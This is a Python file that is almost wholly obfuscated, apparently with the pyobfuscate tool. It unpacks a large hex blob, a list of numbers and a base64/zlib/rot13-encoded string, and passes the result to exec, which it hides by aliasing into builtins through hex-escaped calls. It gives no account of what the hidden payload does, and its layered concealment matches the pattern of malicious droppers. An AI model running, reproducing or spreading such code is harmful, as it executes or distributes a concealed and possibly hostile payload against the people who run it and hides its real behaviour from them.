import random ,base64,codecs,zlib,sys;py=""
sys.setrecursionlimit(1000000000)

pyobfuscate = (lambda **kwargs: (list(kwargs.keys()),list(kwargs.values())))(**{'https://pyobfuscate.com':'UserWarning != int','exec':'C8oYlovl7g8kncxXQzI6BvKDAsgkfOcF71pKEHd6klRwx3E5hbjR1y86wbP5xSuu8vlsoWWZ632O0NHm','eval': bytes.fromhex('''395fd50f6e9c224fdaf80c9645fbf9ac4b40a93f448270d18f24de5decf146196fee89b4d5e94c5192d7d914580eec10bcfe767ffbd956a7814fd8c3bd5b7fad478165517bfcae8f4aeccf89b65560866c933ba737936a77511ddba1903992472b18de44270b1c5f44da02e04bc001209a92c07e0692acdc9d8a4c6a50693d992aee60558ceb373b656ea01f6e1e959372ab417dc03e5e960ee043b214fe9a8a53d57ed6c830e50c1ae26e3d09b95966afb710c117f7d6ec2b0e237824d7be9add78a4cb7aa7323a99435d7d2b077b98ae43309dfe24caf2079082898341896d999de9a886c23fc8524a2b90ec9e17b5d50a760d41cffe5c53d3f6db3d93fec3dfbcff8724d0b9bdf42171b14a4d10529215260503881f1b4332eea508f1c392c481c0c01e916518b8db510e83fc8fbaed74a48da7aa7801de2587bab34eef9581716d878892e2f5a6b9a6530358b65f68524e508b287a134423f220c1f5d485d38f09d4e6ac85b09a6c1b52bf3c8ff103dfa539454e13d2faf42c9b7def49e5a7d217d89025bc1b133a6484dd5d372a18efe184c16aea5faaec986fac00f84c3c8dc71fc2162b7b655970a9cd8ada64db45da6104b8a1de4b530429de273a3a5e1f3ed0ee09d6ed7935704ca609f608b197ce1128789132dda9fcebb2ad6f74e1b34101500bd64194d77076d6573082ecb6e2473d841da234002e1f26d8509b0f7c9449f4982a5b1454619fcf449a2b42a8bf088c1ed0f905160ea4272c3ed0b43656658799e14ec4ceeff29fd0fbc0e848801dca2acf0c43a386e159cdba45e6b7ad064957fba01229dfccd2efdcaca691f463ebd5c8ff0b06fb4dafe4c8ec05c0b3e989915c4f8e0f6ace2711abd9bd36ed758055bfa1887d8bce7c782e25859c357275d86defd938662af81faf40004bbf40c5262a9ac513264b0b59e37c165612bdbf32e8d9833e8ad451c4a52ff2c220700abc3f28ddad6bf00e2625c55bf411d780fafbcfa893ee72885f34bec85eda7426cb19c2a889a10848d968a135309a58bcccac590882b04b0d0471be0a19fbefc9db2f129bd692d564d475532abf82d4b16fd2831ff82c96f4f5dcd9eab36616c7bd69d18972f65c2720fdd9f3cad79387d37abbb0d096051efe343834c91106748e885217bfb15d51000bab004dd8a3753bb82ce877ae1bec45f4a1baaf9057b7d24b142206eb8ecf2c272c92fc72006aa369e2ced3bc13d6cf04744255a87e5201828ce906424970444e493e8966681b32da65566665a1a4135525b93838c41e788950a6e72cf8a8eb14a2a0503160ad7045d986cb73d66ace353ee16a09fa3a7592ac0f6412f20010337447e53d323cb3b2a1273cb49c39c7000ae437b9e82bd67a7ec74528a0cde1b88f3891f88bb0c9f01efd8ee26bed4826ba58c597afb79833d44cc685f6ac8c54ec38792099ccc343b3dd0f7b115d56d8365fe1c5bf8c1fd0d6644ff108ab22337af30534e7c7667196c87dbfd100563c54e8f808e5ee782b275b517912abd38b13c3cfcfb11536a29738ce5e563174997be7655cdf827ab2b2c7eeca77a5bb49c3c4e5b379f3e68e771d30039492da4a3fceb3f292f3f70aedc85f4aa146ffd615fb5a1fd209c9f581bca4b34fef495d731adae0dde023cd5e319dc5766f0e1b69039d5b51202cc85d06883a4e4c6cd29aafe1c0172abbb9dca4c921b2f9da5efdeb39395148507bfee38a14063ce41a799d220e97d83c4337af039de2f2c3687d547c0778f015d9b0443a2aa4327b49436708edd34bab47ed799d4223223817df3293e027195d967467dbfb28f0fc772d397e78b5817a4a6148d07a7b29753dbaa9f228df8d108df2488994a69b56179bbee0042ccfc2abd2026d7e1eba6c81e0bcf064acc5895e3a2ec0f2559c20ceb8b5c855cc5a6a0b0b373ad4cb48de187a952972761ab2ce62fdcbf8561c49d50e7841f87cfe23ac4ce421e2c57558a8f4b75e9092a9ec1627e069a8b2b95b12e42c63a6ef1361d80f2915c182485c7a6bbdbf96abc2e7b98d3572cdaf2d3d1db2a113da9bd937962bcfac743351b8fe3ce67d503b5b5298e07e4843b2f0764d3209c27b8e7908a5d87b958872e300f8662aa024454acfc44832895c797c2b02717c9c74561f70a6021b88ef5f0eee5e0ffe2a6e6ea079ff9c526a4aaf22010d164f1122823d5d652295236e50e9bb376a50c2977e9f124b99d47d7e55b9a808e9e845710803c3ebcdd976c551e515f920f221b15848ebb7b348bf92763b2da05f14aa269790a988da366c8bd6072c811a139401b6f54143b7ffa8726c439d7652cf9e250c64f7d3b5345f0b22fecb83d95a6b72a10ae667de803f8c0179ded236a8b3ae7b65c116c453ea31238eff7ec6a8cabf8a4823af2a2e6a289904affadd408d8e716c5525f2f9693c1ddebe64b1c2b15262257aca285473707716afcb8d9ecfea40a877dad12e9732c86098f21e1329a2994d24fc243eb29a4c801e4b14b9e6cf3c2e01d79634fabd79228482681c07269d623958e1c9d8cf0a9b59886445900c89e1da80ac7962aa473cbaaf5c351ce80ba4ee7acbb64e62122e6ad68e421b815a4905e46b9a853f8bc14cc546615af1fe1e8d1bc187fe2a65de1574d4399eb8898ca724ab2b7c8d362f983a8b44304354d6a4640f7b58744e189bf806d2cdeadb3a380278a0f53fdbf88e3c7efa5cc2aad7c74b421486c051d28427a541cdc5ba5fb35f6c0dfe63259464dbb43071fe9ef7bb605194c5bf0ecd71c5956fd5cf457f7bba91d2416b1ec5f00e2f74998f74c3b1fd32dba86e195d7c1ea64caec0a0270ff4ad17a1b8e88881c1f3876c30552d386095633064080c58751c5747bbda3408ba543b95983e3e6eb736f2c3e80ec0e9864220e2f4baf6101a95b5e67b0f4375a61a8378496fd7fabcbcff37b5fbee97aeea7d3305ad2734d4442cecd267ee0c388820281c521fd318ec1472f0a04085854b3096edcf6a7f7109285d1cc120e5d272b8718f5db7305fe82fc2c94a2821ca748a260835035cf120be80f984375654a4562212e91e7b4d96f385ae39199595daed020d5216d772cbbabd141bbe29358b338e7ecec718e11f17dc8f265196405c6e43316311eb294e7b5e668b496afd61c1e2cd9144610048221514d20295a6a8c4ea4219da3d228a6a70ba1aa8a6275c5ed4cb7ae7a2aa6c86916a06f54237ee6f0afe00421db0f15d877904b6e49a81f0925095d849c4b50b59f655ff047ef125de0aa6ffff3a8d22cdff82f8405ef926ad5d2cf2ec136ad410b50ef6ad25f030296775e6aa0256db303d900b85c577ec706e92fe2a615aca2ccd1136dd495cbd6163cb92be2073d501229465dd93adad191677fe8c425d6bf99789d7d9c97e47630520a5ed47ae0a7f925bd09723ba36bc86c0f1c28f499d917c102bb9560f500c2f41e3625881f34513afa4d783f4920e5901484812e6cf93872ad5be1f36d03d252b7fd4a641e200d214fb12da690a0e776fda2bc00ec90996e9
cf3dc62631b84e7b248724b08e17f942aec4d8a7841dfac94800d537ba058b627fb546dcb039813cf7cb83032140a51db27e0ba24dc5ff7e106cd45964067fbc772be9065d24f8f2d0484a5065af1c7091a2db55e1496677050c35bc2a6afb243d4f10f24ea6115f6e89a1d9f25e4234a9ee89684d393f8c7d8b0d163847e69f3d7011f17835a31584803b60ac223a5dda56de064f6b61db557848d748699709e0be3c4c5461eecd16147aa57b4fb6acf5ebe2d8e0537665775f2568ef72c93ba6c406a34d930adbd3073d59bf07beb05bae3f90a7b9110149fbdf0a7a42239400f981a27d4fcfc4c371fd584ff8559091dc6de7952aa08d461c2a0ec686153f20c8fb93f65aac8e52a0786a47d05ac791651bdcb91e6d2a3ae24805af964e8764efb964d634c49d8fbf9f025a2689272315c1b627a81f7544e0b914f187050d2e5da73e21262b685bc36c4ee862ad1beaf4b553c3f1fad7795bd307163deb44a16c8d5e2caf1a8b144c852c8e84ad2263248e88a98e3a11249fdcd9682bd96b1a18706f0ebbab09462be8cf7aed6bec610d2400116651bef8e9061151ffb753ccd31942f36fa3a75e33faa030ac2be70a9c4672d8aa104ccedbcaef5dd07f80c98e7fbb1b8d7deb1f7b3e219242f71491db6b614840a4dd772b5e5ec6dda45fc532cb987f31645e16dc5c99d88997e61bc97e1f97401e138e9f896a019390961a6495f91d1dedc717a1a90dad69f1c63f859f963a450ac24a5d215493cd7ab0d6192c3a762d454260eb20da94de7867b630c822be45b63507109842716de06003097c23cae358f555c6bb92fbb1e2d8407fad66b1fba922e916856c382b4ce04f365f4881473cc6187b80ed951daa4038f9a56ee7dbf23af768762915e90835d3429daa2ea304eeb6bc3b34a6fdfb30e4bde0f3bff8892a24a1b84eb7e9159496fae2551b834d4fb94d27b0f43327f178dc34c4cd2ccd21ce6995b35e27ae2b1af42a9d52e877270a93d8b0d118e8c90ed154a1c681a91a4a1eff24aa5208e368167d3a3f138e537fc77f9bed997e6c0684b361eed29015bccd611e3726331f5be1863e84eae6b55e8c437ec30fcc0f03f7e3f4b83d165cc3bc3d534dca6596b57ae9b71cc331745e59672c189ebae0fa7bd7e63325a736f3b203a199c3dac6e32861e95c82218c634f07faa08c63ec099a38db6781acb85c73c4249af3f1f9a2fef97a6140b84fe5fd1d75f4fe793bf590bb8ebcd4f84a50ae687ce5ac0deec78bba0d691b057770aa8b279851380b87d3a69b0e91be38c312fb4b02e0e6afb2634a0c2fd30a1414f6c8c60be15474901a716b941106922788694a7b53dc75d2fe3e4a61e44b269ac9846b4a12775f3d00b79783110175a969b740c54d45d127ffd8ac547908f7360a913f8458d9f5683aabddea50f562e1901b946dbdc91866b834358f7f3e250eb8746b2bbaa82b42019573f8c388a5a340eeec7edaca256c2f005e27e8fcb4f4c00bd7da1fddf9a0f48368fc27f8b8f4523298546edc53e11859bf0dc743d8c6d22f42a5c7e5e2ab4317613221abb91b2565f6e85f60894982e70aed0912ab8de0694d9c0dca153d8b65ece9bb86becbe6da12e51d9ec3a236623a37dd5b4de48ce0ece5ce8ddacd25f866f0b600a460bdf9a0bf0ee459f1df70405154a915eb4c8c57aa79342a486d3f8ce304fa0f71c55c4235f4caa03c2f0ec4f882c247e798c97edaf45f5e38fb258d89df8032d8d5d4f95aba494e44e9544689133107a3a4600afd3de0d2ae23896522666123f8187c9c5858b59ba1c1db55d8e50feb6733facb957f428c59b6d81b84c1da151aefb96686b6ee920de697c4e92b2ccb9cb70d15d5fb6eda9db3a298c00f8e55d0fc452b79df226773896eccad57c06e00249fe7dcbc6dd5a3a08b4228bab7d91384d5253134b6285eafe7bdd49a468a523a708c98d03e574e64ac74ac1bb4394502d84c33ede5ac95f8ed16a7aa20c9e278bba27cbf12245e3adff35fd203d96da3679931cf81d8a100927721ccf99daa27ac1a824bb79c6e841688dfbd3338a7af4d58d84c42188d947f85f49f7addf880de6e774a23fac91e75f807a32248fa4707aa982159b630e3f18b9e8f94001d55a35e9cf8324b47d743b5d33dba75e7c770ca3ac050eb19f09af4db291d02061572bfd2069e4ca9083a930185362722a326e8f58af042f8696ee717f3e8cf2ccafeaade9a89bf72a97eed4c4d3a54aa25f4eb89a581281c6aa0c4010752505ac1978e498c51cc56630a2401440704010a7c32176f5fff0424b771d9bac2774294572af7d87948b5f9c6c3c40dc77d4aa746cb8468a12c1581e1c11ab7fabdf66b39b12a7c78c9cb1bae78b9e1fa305ba669fed6aacdc6c423be38f6f54af42018f5424c177aabcd35e0a480f27b229dacf47e77601af440c51531398966a552ecc6434863ed7ea8572b8e3a034fd67aaaeff393077f2fd7794eaa6a0d99803ca9c4e245083eba948c1d90da80ce98f25e341c8afef9e8c964189c9316768b78ab09e608fefb4d2883e247b3a082b926c5bb5a77f180c4d806627e265dfbe0546491a17416c4c027cda0de3dbd81ca2af32f68c186a7b0caaa420c128c6eeb558f9335141e7f36a10e6b736fa039236516f3898446af6e0a1eca97d367894a5a8eddd1efccc08f6e444f5ee2937d4d7003b5573440aacc2af0e84ba1501b43c5e8c2a2eb5bf8c262c87386d647b9ac94264ee2f3f0e6366d6dae9198695f2cb8538352db7256884422050d6d0258ed7682d77502a77bbd4c555c34cfeb57502b88ff964cde7d0875b8880a707397849cd9f4617baada25a0e38243025442d4072ad79847268c79e2151914c072fc9bd6ab482f5dfcfb43348bdbb23f883c182bb44a69db43ee4146eda35d6b10f7ae27253f747194df1bcdb2eeccfc94f30772dcfc6a32bcccc342cb28adcf12b1db58b92d63f51a34cc26e3b252bb9fd5d0fd94daed16483bb0084a008ad263d11d780feb9a9facbeef3880d6106af64a31d793bf39742926291071cd2ddfccec79d7f5f2453961d5811d18368863570424d1cc8ce9bd32369911d70cee7c5f15d8bde1d15c890bbcdeae3a7aae8d2be4124e8afbb54429675cd51c38e82955fc592c9d0845d87c3aa619a1e5029640dc65312afadb04b5a3897a8575c62ab4ae596eb34950df9933e99b311b8b52bfed61e9623dec9e9435e395c2a27fb587745699afd3fdf24f2042a3f9193f38a9bd01bc230087a9707c48c782bbe0d4b9dc457365e4c6b8b937fe77429c0cceaefced932927489b4b33c000316a57e78200fd8559d222c949357967f613670ec519fcf20722abac7feb9e8ec4c479f7a16a394ac139726311a9b139d7b348a3fa675c4469bc4d57b197d5532b4a4c8727ae2db5d0fb435a17f78aeff33f7bbb376bf770546957e342c91bd35fd9cbaeeebeba61e99411f9a84dab12e60def801ba9f147fa498e1b545d65d1562b44be892959c6b85b8830236500d92bdce8
59b82e1da166bb9a67beecc4185a39aef4690da1c5fde9ecb2afd2b2f60456dd2cf150dd49ae5204dfb7626cd69b74bfe1e29d0de8e3c508a5db83ed6fd38950d768f998bceb9e84a32c7f4a597f8038c3d74b14ddf62ef66a01e1435db34c55c342c6e6e3aabd948c07661c1005d1e1332505f992bcc80a07fc02b11ffb3663ff06374efb0724588d41ee22cd78a32e2d220231579dd8127935245d047ace30b8d863cd78a6a79b5b043005e0a67343799dc9c245ce54092a95700108720fc9f1c820bf60c45f4f10ac8675fc8edaf0e92cbaf4ad408ab4390adc08c30a631bd9207fbed686a7721bc26aad49df6f768dec12fae8ce942aed9e7fe4d2781e7af5c2c60257429339f10a16ec1539f827838ea884ba35db9489c9d4f279effb8df1c677ce0845bac1b0d6ad9f864b906eb552f55c245243b0a84284c72775882e4c4f03139e470667fd962703148d6a4966d2539ddec0aa7f7afbffef12f809711563eca53f1566ac2d5b3f30c3da6504e74ecf6a58cc5f342ed49ef375a7722e03b77985fef259b9c47fbb76d89e7fb49c6fd58a8eaa9bda1e34c9da8b15b19a30a7825be007cd3eb697de07bb210ece2c7e0af7ee58cf05e00ea065d3479892d2e78168b1639315f553c91619ff806061045aa3998f4a12ab59a8bdc03dc869202fad48e2d0cf31a815c3000b6ef11e228595003c4af9bc7022ae16e3ceb9dace938ed8d0ddd388e9657c8e8cd345a2b530a0f65e85daf473ed1a7ff5745b2d67bbd10412cd10ccd0c9e4242c5d747eb68b66e19918393e48390ab9eceacfb0203cc995548f33d4167bc7beb6c877d7bee7d857e1e054951e1b5ddbd7dc128261690037481f20203012160d174d4a440072bbae092948865e2c73ff2a5958fc4ed711ca3214f47ea21293269b372eedd7ee6acce40f4333ca8a087309e7113965cc0b86023a23524cbf6607bc5926d4f68dccc037f311961b093addd5ccc5a6f168c82fd851c4faa0bd48f6e3e0f571105316ff65b9d1eb914adc5d26d2b04dc72bc62772b234662a7bdd8987775fe995fae5ff7967ce2e82fbb8105bfa1c4ed72c6271cbfb8965594a7194ab10b25019964a77106cbc7c9fe23544fae71a79722eae17e89a468ac23143792f997f0860aad1609cd8a0abfd316b48a6f9126513a6604ffb996f7932efe936ae31cb9ab891c9347cef56d9283235bc43df671714bc0a485d22dedab1ce40d7903df16e32a52e7b36c97e2d4bb75d2ae8b68fc583927b369afaf48835c7cde4b132287772fdf764f8af08114b2d05d330bd4ef8bb670e862607196612a0b4608272995dbb77ce1a6ae1e8cc57fc9ca73350563846e66c4074bfdf1bc750e19fc0c85538a4a08a0e9233a936897f59a4779820a8d2157fcbef2b0329b2682283615b24e4f0841a5bb15bd97984b7da2c91466c418abdcaf2affe371966a2823a5d3d75fec25bf7eae84b12a3623ae2c99d215833232d231debaa3b6d6dd7e9c2f5798001b68826c250d8f5fa7bd7f5fb64118ca025677c4b7143c809d3947943492be8119da557e440fbd60d7ecd4339834d8e770241c636aa78dc4646c1f03f56e809ade5129578316372c9ae9bb6aba608a5ce1fb41dbdc9581cdcdc8885dd5b31d5d3fc7f5cf8671d0f90caab6fa4f3b5f55e3e148ed62d3c316d4eadb713e34770dcd89b15035379754e6a469382a04fdb471a3bfcc760ef950303fbcd1aecdf64b51bb3698344f201722604d5e9f95b22088faff1c8145b0c5bf873e9aa7b838427943d9613b8bd67d4a1e7f3957c517d3b493bfdf7348b9d8a95b64977db1119ccbedcc33d03428b5bb2a3a5c402c0e6e483e914f0f5c923191553330aa31c978ce3dcf5029c1dd119'''.replace("\n","")) })

_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='173340 8805560 896154 1313092 2579318 789730 639744 257568 342528 2087616 2921076 4804986 6045060 9043621 825024 10964520 165236 10846079 7787403 5794673 5243655 299744 4538705 1367584 664545 6389362 10310720 9037509 7260204 3508768 653344 4463196 3208164 8624020 519530 6131205 7261440 4221063 1381882 6542480 4191892 498104 902270 320544 1697728 3039584 634528 7135856 1776462 1987965 967780 8944064 478680 3175192 3985072 4425435 10842048 1325728 7531440 7633010 5469975 1958892 4943120 5254416 4120092 1846784 1527714 7404714 10891392 9482031 8608937 1154255 9061224 1344465 2946950 2578613 3627143 5550195 3078790 5353600 331344 10291172 812960 1380026 7764848 5969382 5929609 362135 9281650 1440224 8175344 4208490 11217200 4794167 3007092 1178912 11069300 2271948 760160 4902795 804000 5517225 1789996 1516706 741321 4934996 1758309 2770440 1351875 8995800 359760 1477189 951180 181760 3479628 8529192 1587342 5133108 934755 1248856 1406160 1704386 8452184 10446148 3049408 8412656 11119810 1758908 3089686 1021498 9698528 5677683 10506594 192276 2354874 5461560 7644050 7106616 9152823 1089820 7449457 4295710 9534888 288267 6200901 2646758 3672592 6379120 2942600 4417671 1003174 2970612 10663030 2005416 3542756 8935320 2747460 2720034 2113058 1165272 4704612 6906077 7357080 5260484 336340 755160 6032766 6132159 1203094 77220 1732608 1854816 2815872 1970496 6815538 8029362 8617818 3163834 1564512 930846 3031055 181516 3260320 5728820 1546976 9100520 740000 7965930 8766543 10715040 6323559 5994690 1169164 1185536 566711 6388440 7032795 9826175 6728000 5532075 2583136 2931146 8405350 1619872 5879917 5016720 926550 2118496 3039936 1393344 727712 2516034 6586692 7821615 4410358 524576 7927176 5657655 1877632 5866665 7819006 10541440 1572759 4490688 2847916 2985984 813185 5925367 4485488 7177060 7200490 3422826 2657632 8254118 10564705 1563744 3411772 2394104 2061576 5512698 8648630 8651875 6691857 7866824 7225944 341040 115168 2461408 1892736 2048736 6437016 6276051 95634 501054 6113256 6333811 466080 2948985 846560 1669600 4671840 3008728 4262635 98280 1889095 1744275 1755374 3454686 8880704 1578927 5198115 8601012 10791309 5382432 2436896 1595654 4111848 5106092 5949689 5632770 6470360 3818828 5255612 3011880 10668172 2981664 4272485 9900464 205650 1949682 703728 5179038 1896444 3653065 2196094 1743308 3842012 4473588 7319060 5451206 1492424 3905952 4672560 3002312 697714 1109967 5291776 2804439 1548729 5403888 10338762 925452 4092181 2829990 6361616 3835572 4719923 2463289 9747055 1062950 678454 7926048 5279280 4518432 11968 386490 631840 2649152 1818368 2263936 2380832 329700 5344494 2636032 4348252 808080 1355880 1742832 1808051 707250 5317126 1565138 226800 10811874 9121905 1697507 2532802 641890 1702592 923808 1214848 2609888 2912320 987520 675008 3024608 7376712 5365322 4477066 5118543 3318868 299768 3844560 8749328 772436 3216901 5420 2566816 1867872 1405152 1125952 8029298 868428 10079160 3219120 1489120 8910220 496680 3599520 3528112 3003650 2780497 2540772 4462943 2447928 7969170 722007 4832446 5683014 346320 1151008 1722496 2352128 2965408 1188128 3167776 2512416 966080 10928154 5252606 8128675 465090 3124050 351682 796400 6614160 960700 2179314 658690 219936 2439968 2776128 1162688 3669435 2449428 2950304 9276749 3374520 3104000 11132240 3961374 545259 3273443 358741 6605060 3092942 10152000 4178525 180083 2362166 46690 2587136 177824 2894688 689920 2751584 1276544 2648288 3129632 1765841 9990750 3758632 7037264 796352 7664772 644896 3605397 657360 1030320 10002470 897492 7808202 2996120 918064 162894 1239471 3436180 3194232 2711296 2371024 311149 1360288 1846395 7323545 251744 9497030 148480 9319876 4303024 9047570 4703754 9365265 5626116 4798106 1910240 10078830 7144092 9834324 1653440 8642562 5062500 2781030 1635326 782240 2229568 1040608 802784 809984 6763768 11433480 1505809 1679931 1201560 5953818 10601808 7089190 5075510 448280 6688304 2111000 4030997 4081580 8018874 3351685 6049211 7803900 3757400 1161571 2562172 495520 2928896 3056576 406880 171936 118670 9409362 7237560 322542 1423797 139104 11566940 2242744 507990 29472 428640 1702240 1983808 10029199 9099840 8076061 7080084 3203200 4696896 7679232 1763451 943270 890070';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJyLKi/JcnL3M3UKLDFxCizIigosMY1yrzAGAGYBCAQ=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kMtugzAURH8pOKCGpSPiBoOjIFxj2AFteIRXWhtsf33dtOruzGikmXuzYSlZmcnZnLoZeSPBoeKp/xU5hyo26Uhe411uGID0pGPgK4LkNgPL+6IlNHwyf6tvE2Z/2ukXE47LINc4ghpuQRtv8e4/S1nNkacIhh2h54qje/+JvPcZ6JZTWC2rrOcyqCZ0cDlSghh/YFSJCbsCj+perL04JsLNrxev2MSNJYX348Hk4kZI1bkJ29+dwvao+ghCl+CiegDp8b3uHqiRizl/2I2SUN2SodlNVI8cSGe6Ptl66mUxqb3Hb/ISaoKDqkBqzeyvvgEFpGq5")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
